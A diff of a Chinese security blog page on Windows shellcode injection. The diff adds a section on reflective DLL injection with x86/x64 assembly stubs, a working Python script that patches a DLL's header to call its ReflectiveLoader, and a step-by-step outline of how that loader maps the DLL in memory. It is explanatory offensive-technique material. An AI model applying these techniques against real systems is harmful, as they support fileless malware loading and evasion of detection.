@@ -55,13 +55,13 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2022-01-11T23:25:59+08:00",
-        "dateModified": "2022-01-11T23:31:32+08:00",
+        "dateModified": "2022-03-27T20:35:28+08:00",
         "url": "https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/",
         "headline": "Windows Shellcode 注入姿势",
         "description": "APC APC（Asynchronous Procedure Call 异步过程调用）是在 Windows 中常用的机制，用于将要在特……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  3218 ,
+        "wordCount":  5083 ,
         "image": "https://myzxcg.com/icons/favicon.ico",
         "author": {
             "@type": "Person",
@@ -106,7 +106,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/icons/favicon.ico" />
     <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2022-01-11T23:25:59&#43;08:00" />
-    <meta property="article:modified_time" content="2022-01-11T23:31:32&#43;08:00" />
+    <meta property="article:modified_time" content="2022-03-27T20:35:28&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -238,7 +238,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;7&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;11&nbsp;分钟</span>
     
 
    
@@ -261,6 +261,12 @@
     <li><a id="contents:理解-void---lpbaseaddress" href="#理解-void---lpbaseaddress">理解 <code>(*(void (* )()) lpBaseAddress)()</code></a></li>
     <li><a id="contents:远程线程注入" href="#远程线程注入">远程线程注入</a></li>
     <li><a id="contents:内存映射注入" href="#内存映射注入">内存映射注入</a></li>
+    <li><a id="contents:reflective-dll" href="#reflective-dll">Reflective DLL</a>
+      <ol>
+        <li><a id="contents:dosheader-修改" href="#dosheader-修改">DOSHeader 修改</a></li>
+        <li><a id="contents:reflectiveloader-分析" href="#reflectiveloader-分析">ReflectiveLoader 分析</a></li>
+      </ol>
+    </li>
     <li><a id="contents:参考" href="#参考">参考</a></li>
   </ol>
 </nav><div class="post-body e-content">
@@ -797,7 +803,239 @@
 </span></span><span class="line"><span class="cl"><span class="n">NtTestAlert</span><span class="p">();</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+</div><h2 id="reflective-dll"><a href="#reflective-dll" class="anchor-link">#</a><a href="#contents:reflective-dll" class="headings">Reflective DLL</a></h2>
+<p>反射DLL 是指：编写DLL 自加载函数（ReflectiveLoader）并导出，然后将PE文件起始字节修改成调用ReflectiveLoader 函数的硬编码。通过ReflectiveLoader 函数使DLL 的PE 结构在内存中展开、修复重定位表、修复IAT表，最后获取DllMain 入口函数地址并执行。</p>
+<p>这种方式也可以变相的认为是一种将DLL 变成ShellCode 的技术，不依赖loadlibrary函数且DLL 文件不落地。同样，也可以用上面介绍的ShellCode 注入方式来加载。</p>
+<h3 id="dosheader-修改"><a href="#dosheader-修改" class="anchor-link">#</a><a href="#contents:dosheader-修改" class="headings">DOSHeader 修改</a></h3>
+<p>修改PE 文件头起始字节，将其改成调用ReflectiveLoader函数的汇编指令。PE 文件都是以MZ字符开头，对应的16进制是4D5A。在将其当作代码执行时，在X86 32位程序上，4D5A 代表<code>dec ebp</code> <code>pop edx</code> 两条指令。（<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">Hex To ASM Online</a>）所以，如果要保留MZ 这两个字符的话，那么就需要抵消这两条指令的影响。</p>
+<p><strong>X86</strong></p>
+<pre tabindex="0"><code class="language-wasm" data-lang="wasm">dec ebp                  ;ebp -1
+pop edx                  ;edx=[esp] esp+4
+//抵消上两条指令的影响
+inc ebp
+push edx
+call 0                   ;把下一行指令地址压栈，即pop edx指令地址
+pop edx                  ;取出栈中的地址，保存到edx寄存器中
+add edx,&lt;FuncOffset-9&gt;   ;计算ReflectiveLoader函数在内存中的位置
+push ebp
+mov ebp, esp             ;保存初始堆栈
+call edx                 ;调用ReflectiveLoader函数
+</code></pre><p><strong>x64</strong></p>
+<pre tabindex="0"><code class="language-wasm" data-lang="wasm">41 5a                   ;pop r10
+41 52                   ;push r10
+e8 00 00 00 00          ;call 0
+5b                      ;pop rbx
+48 81 c3 09 00 00 00    ;add rbx, &lt;FuncOffset-9&gt;
+55                      ;push  rbp
+48 89 e5                ;mov rbp, rsp
+ff d3                   ;call rbx
+</code></pre><p>Python 代码修改PE 文件开头几字节（比较简单，用的idiotc4t 代码）</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pefile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">help</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;usage: python3 &lt;DllPath&gt; &lt;FuncName&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_func_offset</span><span class="p">(</span><span class="n">pe_file</span><span class="p">,</span><span class="n">func_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">pe_file</span><span class="p">,</span><span class="s1">&#39;DIRECTORY_ENTRY_EXPORT&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">export</span> <span class="ow">in</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">DIRECTORY_ENTRY_EXPORT</span><span class="o">.</span><span class="n">symbols</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">func_name</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">export</span><span class="o">.</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">func_rva</span> <span class="o">=</span> <span class="n">export</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">func_rva</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] not found function offset in file&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">offset_va</span> <span class="o">=</span> <span class="n">func_rva</span> <span class="o">-</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">get_section_by_rva</span><span class="p">(</span><span class="n">func_rva</span><span class="p">)</span><span class="o">.</span><span class="n">VirtualAddress</span>
+</span></span><span class="line"><span class="cl">    <span class="n">func_file_offset</span> <span class="o">=</span> <span class="n">offset_va</span> <span class="o">+</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">get_section_by_rva</span><span class="p">(</span><span class="n">func_rva</span><span class="p">)</span><span class="o">.</span><span class="n">PointerToRawData</span>
+</span></span><span class="line"><span class="cl">    <span class="n">func_file_offset</span> <span class="o">-=</span> <span class="mi">9</span> 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">func_file_offset</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_patch_stub</span><span class="p">(</span><span class="n">pe_file</span><span class="p">,</span><span class="n">func_offset</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">FILE_HEADER</span><span class="o">.</span><span class="n">Machine</span> <span class="o">==</span> <span class="mh">0x014c</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">is64</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">FILE_HEADER</span><span class="o">.</span><span class="n">Machine</span> <span class="o">==</span><span class="mh">0x0200</span> <span class="ow">or</span> <span class="n">pe_file</span><span class="o">.</span><span class="n">FILE_HEADER</span><span class="o">.</span><span class="n">Machine</span> <span class="o">==</span><span class="mh">0x8664</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">is64</span> <span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-]unknow the format of this pe file&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is64</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">stub</span> <span class="o">=</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x4D\x5A</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x41\x52</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe8\x00\x00\x00\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x81\xC3</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">func_offset</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x55</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x89\xE5</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xFF\xD3</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">stub</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x4D</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5A</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x52</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xE8\x00\x00\x00\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5A</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x81\xC2</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">func_offset</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x55</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8B\xEC</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xFF\xD2</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">stub</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">patch_dll</span><span class="p">(</span><span class="n">pe_path</span><span class="p">,</span><span class="n">func_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pe_file</span> <span class="o">=</span><span class="n">pefile</span><span class="o">.</span><span class="n">PE</span><span class="p">(</span><span class="n">pe_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">func_offset</span> <span class="o">=</span> <span class="n">get_func_offset</span><span class="p">(</span><span class="n">pe_file</span><span class="p">,</span><span class="n">func_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">patch_stub</span> <span class="o">=</span> <span class="n">get_patch_stub</span><span class="p">(</span><span class="n">pe_file</span><span class="p">,</span><span class="n">func_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">filearray</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">pe_path</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] loaded nameof </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span> <span class="p">(</span><span class="n">pe_path</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">patch_dll_file</span> <span class="o">=</span> <span class="n">patch_stub</span> <span class="o">+</span> <span class="n">filearray</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">patch_stub</span><span class="p">):]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] patched offset </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">func_offset</span><span class="o">.</span><span class="n">hex</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">patch_dll_name</span> <span class="o">=</span> <span class="s2">&#34;patch-&#34;</span> <span class="o">+</span><span class="n">pe_path</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">open</span><span class="p">(</span><span class="n">patch_dll_name</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">patch_dll_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] wrote nameof </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span> <span class="p">(</span><span class="n">patch_dll_name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pe_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span>  <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">patch_dll</span><span class="p">(</span><span class="n">pe_path</span><span class="p">,</span><span class="n">func_name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>至于指令后面DOS的特征，可以都置0或杂乱的值（就像CS 处理的一样）。</p>
+<h3 id="reflectiveloader-分析"><a href="#reflectiveloader-分析" class="anchor-link">#</a><a href="#contents:reflectiveloader-分析" class="headings">ReflectiveLoader 分析</a></h3>
+<p>参考一下经典项目：https://github.com/rapid7/ReflectiveDLLInjection ，只需要看其中Reflective Dll 项目即可。分析ReflectiveLoader 导出函数之前需要先了解PE 结构以及IAT 表、基址重定位表是如何工作的。项目中注释有很多，看着注释能明白每步操作含义，下面总结一下重要的几个步骤（篇幅影响就不截图了）。</p>
+<ol>
+<li>首先需要获取当前DLL 加载到内存中的首地址。通过<code>_ReturnAddress()</code> 获取到下一条指令的地址，接着向前循环查找，直到找到MZ标志，然后获取PE 头地址。（这也是为什么保留了MZ的原因，用于定位DLL的首地址）</li>
+<li>从当前进程的PEB中获取当前进程kernel32.dll中<code>LoadLibraryA、GetProcAddress、VirtualAlloc、VirtualLock</code>函数地址以及ntdll.dll中的<code>NtFlushInstructionCache</code> 函数地址。通过比对这几个函数Hash来确定函数，从而获取函数地址。</li>
+<li>分配一块新内存空间，将当前DLL 在内存中展开。将PE 头、各区块复制到新分配的内存。之所以复制到新内存空间是为了按照各节区的RVA 以及大小在内存中对齐。</li>
+<li>接着重要的来了，处理当前DLL 的导入表。首先使用loadlibraryA函数根据导入表加载DLL，然后修复IAT 表中的导入函数地址。如果通过序号导入则手动解析导出函数地址，否则使用 <code>GetProcAddress()</code>函数得到地址。</li>
+<li>然后修复基址重定位表，修改硬编码的地址。修复过基址之后要调用 <code>NtFlushInstructionCache</code>函数刷新指令缓存。</li>
+<li>接着从PE 头中获取DLLMain地址并调用。</li>
+</ol>
+<p>这最后四步其实就是做的PE加载器的活。写好ReflectiveLoader 导出函数并编译DLL，修改此DLL DOS 头后，就可以直接当作shellcode 来用了。</p>
+<p>上面的技术要求DLL 必须实现导出函数，其实可以把ReflectiveLoader 直接写在PE 一个空白区块中，确定地址后再进行调用。例如 <a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">https://github.com/hasherezade/pe_to_shellcode</a> 就是这样实现的，由此可以把PE 文件直接当作ShellCode 执行且还能让PE 文件依旧有效。</p>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
 <ol>
 <li>
 <p><a href="https://blog.csdn.net/qq_38493448/article/details/104006686" target="_blank" rel="noopener">Windows Ring3层注入--&quot;QueueUserAPC&quot; APC注入（四）_手拿肉的美女剑豪的博客-CSDN博客</a></p>
@@ -807,6 +1045,12 @@
 </li>
 <li>
 <p><a href="https://idiotc4t.com/code-and-dll-process-injection/mapping-injection" target="_blank" rel="noopener">Mapping Injection</a></p>
+</li>
+<li>
+<p><a href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation" target="_blank" rel="noopener">ReflectiveDLLInjection变形应用</a></p>
+</li>
+<li>
+<p><a href="https://sharpblog.cn/post/2021-08-25-reflecive-dll-inject" target="_blank" rel="noopener">Reflective Dll Inject 原理解析</a></p>
 </li>
 </ol>
 
